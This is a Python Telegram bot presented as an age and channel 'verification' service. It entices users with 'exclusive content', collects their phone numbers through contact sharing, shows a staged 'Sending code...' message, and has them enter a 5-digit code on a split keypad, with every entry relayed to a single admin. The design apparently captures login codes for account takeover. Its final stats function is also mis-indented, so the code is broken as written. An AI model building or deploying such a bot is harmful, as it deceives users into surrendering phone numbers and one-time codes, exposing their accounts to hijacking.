import logging
import random
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest
import sqlite3
from datetime import datetime, timedelta

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration - Get from Railway environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '6483793776'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '-1003097423499')

class VerificationBot:
    def __init__(self):
        self.init_database()
        self.verification_sessions = {}  # Store active verification sessions
        
    def init_database(self):
        """Initialize SQLite database"""
        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending_verifications (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                entered_code TEXT,
                timestamp DATETIME,
                code_entered_time DATETIME,
                status TEXT DEFAULT 'pending',
                admin_notified BOOLEAN DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verified_date DATETIME
            )
        ''')
        
        # Store join requests to track pending approvals
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending_join_requests (
                user_id INTEGER,
                chat_id TEXT,
                chat_title TEXT,
                request_date DATETIME,
                status TEXT DEFAULT 'pending',
                PRIMARY KEY (user_id, chat_id)
            )
        ''')
        
        self.conn.commit()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler - Exciting welcome message"""
        user = update.message.from_user
        
        welcome_text = f"""
🌟 Excited to explore something fresh and thrilling?

🚀 Confirm your age to unlock an exclusive content collection!

⚡ Act fast — spots are limited!
        """
        
        # Create contact sharing button
        contact_keyboard = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Share My Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=contact_keyboard
        )
        
        # Store pending verification
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO pending_verifications 
            (user_id, username, first_name, timestamp, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (user.id, user.username, user.first_name, datetime.now(), 'awaiting_contact'))
        self.conn.commit()

    async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle new join requests to the channel"""
        try:
            user = update.chat_join_request.from_user
            chat = update.chat_join_request.chat
            
            # Log the join request
            logger.info(f"New join request from {user.first_name} (@{user.username}) to {chat.title}")
            
            # Store join request details for later approval
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO pending_join_requests 
                (user_id, chat_id, chat_title, request_date, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (user.id, str(chat.id), chat.title, datetime.now(), 'pending'))
            self.conn.commit()
            
            # Check if user is already verified
            cursor.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,))
            if cursor.fetchone():
                # User is already verified, approve immediately
                await context.bot.approve_chat_join_request(chat.id, user.id)
                
                # Update join request status
                cursor.execute('''
                    UPDATE pending_join_requests 
                    SET status = 'approved' 
                    WHERE user_id = ? AND chat_id = ?
                ''', (user.id, str(chat.id)))
                self.conn.commit()
                
                await context.bot.send_message(
                    user.id,
                    "✅ **Welcome back!**\n\nYou're already verified. Your join request has been approved! 🎉",
                    parse_mode='Markdown'
                )
                return
            
            # Notify admin about the join request
            admin_message = f"""
🔔 **New Join Request**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📢 **Channel:** {chat.title}
🆔 **Chat ID:** `{chat.id}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

User needs to complete verification process first.
Join request has been stored and will be auto-approved after verification.
            """
            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
            
            # Send verification message to user
            verification_message = f"""
🔐 **Verification Required**

Hello {user.first_name}! 

I noticed you requested to join **{chat.title}**. To get approved, please complete our automated verification process.

**Don't worry:** Your join request has been saved. Once you complete verification, you'll be automatically approved - no need to request again!

Please click /start to begin verification.
            """
            
            await context.bot.send_message(user.id, verification_message, parse_mode='Markdown')
            
        except Exception as e:
            logger.error(f"Error handling join request: {e}")
            await context.bot.send_message(ADMIN_ID, f"❌ Error handling join request: {e}")

    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact sharing"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            # Verify it's the user's own contact
            if contact.user_id != user.id:
                await update.message.reply_text(
                    "❌ You need to share your own contact info, not someone else's.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            # Update database with phone number
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO pending_verifications 
                (user_id, username, first_name, phone_number, timestamp, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user.id, user.username, user.first_name, contact.phone_number, datetime.now(), 'contact_shared'))
            self.conn.commit()
            
            # Remove the reply keyboard
            await update.message.reply_text(
                "⏳ Processing your information...",
                reply_markup=ReplyKeyboardRemove()
            )
            
            # Wait a moment for effect
            await asyncio.sleep(1)
            
            # Send "Sending code..." status message
            status_msg = await update.message.reply_text("📨 Sending code...")
            
            # Wait another moment
            await asyncio.sleep(1.5)
            
            # Delete status message
            await status_msg.delete()
            
            # Send "Enter the code!" message with button
            code_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Get code!", callback_data=f"request_code_{user.id}")]
            ])
            
            await update.message.reply_text(
                "☑️ Enter the code!",
                reply_markup=code_keyboard
            )
            
            # Send detailed notification to admin with action buttons
            admin_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🔢 Setup Code for {user.first_name}", callback_data=f"setup_code_{user.id}")],
                [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")]
            ])
            
            admin_notification = f"""
📱 **Contact Info Received - Action Required**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📞 **Phone:** `{contact.phone_number}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Next Action:** Setup verification code for this user.

**Instructions:**
1. Click the "Setup Code" button below
2. I'll generate a 5-digit code and enable code input for the user
3. **You need to send this code to the user separately** (SMS, call, etc.)
4. User will be able to enter the code here
5. You'll see what code they entered and can approve/reject

**Note:** The bot will NOT send the code to the user. You must send it via SMS or other method.
            """
            
            await context.bot.send_message(
                ADMIN_ID, 
                admin_notification, 
                parse_mode='Markdown',
                reply_markup=admin_keyboard
            )
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await update.message.reply_text("❌ Error processing contact. Please try again.")

    async def handle_admin_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin callback buttons"""
        query = update.callback_query
        
        # Only admin can use these buttons
        if query.from_user.id != ADMIN_ID:
            await query.answer("❌ Admin only function")
            return
            
        await query.answer()
        
        if query.data.startswith('setup_code_'):
            user_id = int(query.data.split('_')[2])
            
            # Generate 5-digit verification code
            verification_code = str(random.randint(10000, 99999))
            
            # Update database with code
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE pending_verifications 
                SET verification_code = ?, status = 'code_ready'
                WHERE user_id = ?
            ''', (verification_code, user_id))
            self.conn.commit()
            
            # Get user info
            cursor.execute('''
                SELECT first_name, username, phone_number 
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            user_info = cursor.fetchone()
            
            if user_info:
                first_name, username, phone_number = user_info
                
                # Send code input interface to user (but don't send the actual code)
                await self.send_code_input_interface(context, user_id, verification_code)
                
                # Show the generated code to admin ONLY
                await query.edit_message_text(
                    f"""
🔢 **Code Generated - SEND THIS TO USER**

👤 **User:** {first_name} (@{username})
📞 **Phone:** `{phone_number}`
🔢 **Generated Code:** `{verification_code}`

**IMPORTANT:** 
⚠️ **YOU MUST SEND THIS CODE TO THE USER via SMS or phone call**
⚠️ **The bot will NOT send this code automatically**

**Steps:**
1. Send the code `{verification_code}` to phone number `{phone_number}`
2. User can now enter the code using the interface I just sent them
3. You'll be notified when they enter their code for approval

**Next:** Send code `{verification_code}` to `{phone_number}` now.
                    """,
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text("❌ User not found in pending verifications.")
                
        elif query.data == 'view_pending':
            await self.show_pending_users(query, context)
            
        elif query.data.startswith('approve_user_'):
            user_id = int(query.data.split('_')[2])
            await self.admin_approve_user(query, context, user_id, True)
            
        elif query.data.startswith('reject_user_'):
            user_id = int(query.data.split('_')[2])
            await self.admin_approve_user(query, context, user_id, False)

    async def admin_approve_user(self, query, context, user_id, approved):
        """Admin approves or rejects user verification"""
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT first_name, username, phone_number, verification_code, entered_code
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_info = cursor.fetchone()
            if not user_info:
                await query.edit_message_text("❌ User not found.")
                return
                
            first_name, username, phone_number, correct_code, entered_code = user_info
            
            if approved:
                # Add to verified users
                cursor.execute('''
                    INSERT OR REPLACE INTO verified_users 
                    (user_id, username, first_name, phone_number, verified_date)
                    VALUES (?, ?, ?, ?, ?)
                ''', (user_id, username, first_name, phone_number, datetime.now()))
                
                # Update pending verification status
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET status = 'verified'
                    WHERE user_id = ?
                ''', (user_id,))
                
                self.conn.commit()
                
                # Approve ALL pending join requests for this user
                approved_chats = await self.approve_pending_join_requests(context, user_id)
                
                if approved_chats:
                    chat_list = "\n".join([f"• {chat}" for chat in approved_chats])
                    status_text = f"""
✅ **Verification Complete!**

Congratulations! Your verification has been processed successfully.

**Automatically Approved For:**
{chat_list}

Welcome! 🎉

**Note:** You don't need to request to join again. You've been automatically approved for all channels you previously requested to join.
                    """
                else:
                    status_text = f"""
✅ **Verification Complete!**

Your verification has been processed successfully! 

**Next Step:** You can now join any private channels. Your future join requests will be automatically approved.

**Channel ID:** `{CHANNEL_ID}`

Welcome! 🎉
                    """
                
                # Notify user of approval
                await context.bot.send_message(user_id, status_text, parse_mode='Markdown')
                
                # Update admin message
                await query.edit_message_text(
                    f"""
✅ **User Verification APPROVED**

👤 **User:** {first_name} (@{username})
📱 **Phone:** {phone_number}
🔢 **Sent Code:** `{correct_code}`
🔢 **User Entered:** `{entered_code}`
⏰ **Approved:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📢 **Auto-approved for:** {len(approved_chats)} channel(s)

✅ **Status:** User has been verified and auto-approved for all pending join requests.
                    """,
                    parse_mode='Markdown'
                )
                
            else:
                # Rejection
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET status = 'rejected'
                    WHERE user_id = ?
                ''', (user_id,))
                self.conn.commit()
                
                # Notify user of rejection
                rejection_text = f"""
❌ **Verification Failed**

Unfortunately, your verification could not be completed.

**Reason:** The code you entered did not match our records.

**What you entered:** `{entered_code}`

If you believe this is an error, please try the verification process again by sending /start.
                """
                
                await context.bot.send_message(user_id, rejection_text, parse_mode='Markdown')
                
                # Update admin message
                await query.edit_message_text(
                    f"""
❌ **User Verification REJECTED**

👤 **User:** {first_name} (@{username})
📱 **Phone:** {phone_number}
🔢 **Sent Code:** `{correct_code}`
🔢 **User Entered:** `{entered_code}`
⏰ **Rejected:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

❌ **Status:** User verification has been rejected.
                    """,
                    parse_mode='Markdown'
                )
            
            # Clean up session if exists
            if user_id in self.verification_sessions:
                del self.verification_sessions[user_id]
                
        except Exception as e:
            logger.error(f"Error in admin approval: {e}")
            await query.edit_message_text("❌ Error processing approval. Please try again.")

    async def approve_pending_join_requests(self, context, user_id):
        """Approve all pending join requests for a verified user"""
        approved_chats = []
        
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT chat_id, chat_title 
                FROM pending_join_requests 
                WHERE user_id = ? AND status = 'pending'
            ''', (user_id,))
            
            pending_requests = cursor.fetchall()
            
            for chat_id, chat_title in pending_requests:
                try:
                    # Convert chat_id back to int if it's numeric
                    if chat_id.lstrip('-').isdigit():
                        chat_id_int = int(chat_id)
                    else:
                        chat_id_int = chat_id
                    
                    # Try to approve the join request
                    await context.bot.approve_chat_join_request(chat_id_int, user_id)
                    
                    # Update status to approved
                    cursor.execute('''
                        UPDATE pending_join_requests 
                        SET status = 'approved'
                        WHERE user_id = ? AND chat_id = ?
                    ''', (user_id, chat_id))
                    
                    approved_chats.append(chat_title)
                    logger.info(f"Auto-approved join request for user {user_id} in {chat_title}")
                    
                except BadRequest as e:
                    logger.error(f"Failed to approve join request for {user_id} in {chat_title}: {e}")
                    # Update status to failed
                    cursor.execute('''
                        UPDATE pending_join_requests 
                        SET status = 'failed'
                        WHERE user_id = ? AND chat_id = ?
                    ''', (user_id, chat_id))
                except Exception as e:
                    logger.error(f"Unexpected error approving join request: {e}")
            
            self.conn.commit()
            
        except Exception as e:
            logger.error(f"Error in approve_pending_join_requests: {e}")
        
        return approved_chats

    async def show_pending_users(self, query, context):
        """Show pending verification users to admin"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT user_id, first_name, username, phone_number, timestamp, status, entered_code, verification_code
            FROM pending_verifications 
            WHERE status IN ('contact_shared', 'awaiting_contact', 'code_ready', 'code_entered')
            ORDER BY timestamp DESC
        ''')
        
        pending = cursor.fetchall()
        
        if not pending:
            await query.edit_message_text("📋 No pending verifications at the moment.")
            return
            
        message = "📋 **Pending Verifications:**\n\n"
        
        for user in pending:
            user_id, first_name, username, phone, timestamp, status, entered_code, verification_code = user
            
            # Get pending join requests for this user
            cursor.execute('''
                SELECT COUNT(*) FROM pending_join_requests 
                WHERE user_id = ? AND status = 'pending'
            ''', (user_id,))
            pending_joins = cursor.fetchone()[0]
            
            status_emoji = {
                'awaiting_contact': '⏳',
                'contact_shared': '📱',
                'code_ready': '🔢',
                'code_entered': '✏️'
            }
            
            message += f"{status_emoji.get(status, '❓')} **{first_name}** (@{username})\n"
            message += f"   📞 `{phone or 'No contact yet'}`\n"
            message += f"   🕐 {timestamp}\n"
            message += f"   📊 Status: {status}\n"
            message += f"   🔗 Pending joins: {pending_joins}\n"
            
            if verification_code and status == 'code_ready':
                message += f"   🔢 Code to send: `{verification_code}`\n"
            elif entered_code and verification_code:
                message += f"   🔢 Generated: `{verification_code}` | Entered: `{entered_code}`\n"
                
            message += "\n"
            
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="view_pending")]
        ])
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=keyboard)

    async def send_code_input_interface(self, context, user_id, verification_code):
        """Send numeric input interface to user"""
        try:
            # Create numeric keyboard - styled like the image
            keyboard = [
                [InlineKeyboardButton('1', callback_data=f'num_1_{user_id}'),
                 InlineKeyboardButton('2', callback_data=f'num_2_{user_id}'),
                 InlineKeyboardButton('3', callback_data=f'num_3_{user_id}')],
                [InlineKeyboardButton('4', callback_data=f'num_4_{user_id}'),
                 InlineKeyboardButton('5', callback_data=f'num_5_{user_id}'),
                 InlineKeyboardButton('6', callback_data=f'num_6_{user_id}')],
                [InlineKeyboardButton('7', callback_data=f'num_7_{user_id}'),
                 InlineKeyboardButton('8', callback_data=f'num_8_{user_id}'),
                 InlineKeyboardButton('9', callback_data=f'num_9_{user_id}')],
                [InlineKeyboardButton('0', callback_data=f'num_0_{user_id}')]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            message = "..."
            
            await context.bot.send_message(
                user_id,
                message,
                reply_markup=reply_markup
            )
            
            # Initialize verification session
            self.verification_sessions[user_id] = {
                'entered_code': '',
                'correct_code': verification_code,
                'message_id': None
            }
            
        except Exception as e:
            logger.error(f"Error sending code interface: {e}")

    async def handle_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle user inline keyboard callbacks"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            data = query.data
            
            await query.answer()
            
            # Handle "Get code!" button
            if data.startswith('request_code_'):
                # Just acknowledge - admin needs to set up code first
                await query.edit_message_text(
                    "⏳ Please wait while we prepare your verification code...\n\nAn admin will set up your code shortly."
                )
                return
            
            # Extract user_id from callback data
            if not data.endswith(f'_{user_id}'):
                await query.edit_message_text("❌ Session error. Please start verification again.")
                return
                
            if user_id not in self.verification_sessions:
                await query.edit_message_text("❌ Session expired. Please contact support to resend code.")
                return
            
            session = self.verification_sessions[user_id]
            
            if data.startswith(f'num_'):
                # Add number to entered code
                number = data.split('_')[1]
                if len(session['entered_code']) < 5:
                    session['entered_code'] += number
                
                # Check if code is complete (5 digits)
                if len(session['entered_code']) == 5:
                    # Auto-submit when 5 digits are entered
                    await self.submit_verification_code(query, context, user_id, session)
                else:
                    # Just update the display with dots
                    await query.edit_message_text(
                        "...",
                        reply_markup=query.message.reply_markup
                    )
                
        except Exception as e:
            logger.error(f"Error handling user callback: {e}")
            await query.edit_message_text("❌ An error occurred. Please contact support.")

    async def submit_verification_code(self, query, context, user_id, session):
        """Submit the verification code for review"""
        try:
            # Save entered code to database
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE pending_verifications 
                SET entered_code = ?, code_entered_time = ?, status = 'code_entered'
                WHERE user_id = ?
            ''', (session['entered_code'], datetime.now(), user_id))
            self.conn.commit()
            
            # Notify user that code is being processed
            await query.edit_message_text(
                f"✅ Code submitted!\n\n⏳ Verifying your code...\n\nPlease wait a moment."
            )
            
            # Get user info for admin notification
            cursor.execute('''
                SELECT first_name, username, phone_number, verification_code
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_info = cursor.fetchone()
            if user_info:
                first_name, username, phone_number, correct_code = user_info
                
                # Create admin approval buttons
                admin_keyboard = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("✅ Approve", callback_data=f"approve_user_{user_id}"),
                        InlineKeyboardButton("❌ Reject", callback_data=f"reject_user_{user_id}")
                    ],
                    [InlineKeyboardButton("📋 View All Pending", callback_data="view_pending")]
                ])
                
                # Send admin notification
                admin_message = f"""
🔍 **CODE REVIEW REQUIRED**

👤 **User:** {first_name} (@{username})
🆔 **User ID:** `{user_id}`
📱 **Phone:** {phone_number}
⏰ **Submitted:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔢 **Generated Code:** `{correct_code}`
🔢 **User Entered:** `{session['entered_code']}`

**Match Status:** {'✅ CORRECT' if session['entered_code'] == correct_code else '❌ INCORRECT'}

**Action Required:** Please review and approve or reject this verification.
                """
                
                await context.bot.send_message(
                    ADMIN_ID,
                    admin_message,
                    parse_mode='Markdown',
                    reply_markup=admin_keyboard
                )
                
        except Exception as e:
            logger.error(f"Error submitting verification code: {e}")

    async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show admin statistics"""
        if update.message.from_user.id != ADMIN_ID:
            return
            
        cursor = self.conn.cursor()
        
        # Get stats
        cursor.execute('SELECT COUNT(*) FROM verified_users')
        verified_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status NOT IN ("verified", "rejected")')
        pending_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "code_entered"')
        awaiting_approval = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "verified"')
        total_verified = cursor.fetchone()[0]
        
        # Get join request stats
        cursor.execute('SELECT COUNT(*) FROM pending_join_requests WHERE status = "pending"')
        pending_joins = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_join_requests WHERE status = "approved"')
        approved_joins = cursor.fetchone()[0]
        
        stats_message = f"""
📊 **Bot Statistics**

**Verification Status:**
✅ **Verified Users:** {verified_count}
⏳ **Pending Verifications:** {pending_count}
🔍 **Awaiting Approval:** {awaiting_approval}
📈 **Total Processed:** {total_verified}

**Join Requests:**
⏳ **Pending Joins:** {pending_joins}
✅ **Auto-approved:** {approved_joins}

**Recent Verifications:**
        """
        
        # Get recent verifications
        cursor.execute('''
            SELECT first_name, username, verified_date 
            FROM verified_users 
            ORDER BY verified_date DESC 
            LIMIT 5
        ''')
        
        recent = cursor.fetchall()
        for user in recent:
            stats_message += f"\n• {user[0]} (@{user[1]}) - {user[2]}"
            
        # Add action buttons
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")],
    ])
        
    await update.message.reply_text(stats_message, parse_mode='Markdown', reply_markup=keyboard)

def main():
    """Main function to run the bot"""
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not found in environment variables!")
        return
    
    # Create bot instance
    bot = VerificationBot()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("stats", bot.admin_stats))
    
    # Handle contact sharing
    application.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
    
    # Handle join requests
    application.add_handler(ChatJoinRequestHandler(bot.handle_join_request))
    
    # Handle callbacks - separate admin and user callbacks
    application.add_handler(CallbackQueryHandler(
        bot.handle_admin_callback,
        pattern='^(setup_code_|view_pending|approve_user_|reject_user_)'
    ))
    
    application.add_handler(CallbackQueryHandler(
        bot.handle_user_callback,
        pattern='^(num_|request_code_)'
    ))
    
    # Log startup
    logger.info("Bot started successfully!")
    logger.info(f"Admin ID: {ADMIN_ID}")
    logger.info(f"Channel ID: {CHANNEL_ID}")
    
    # Start the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
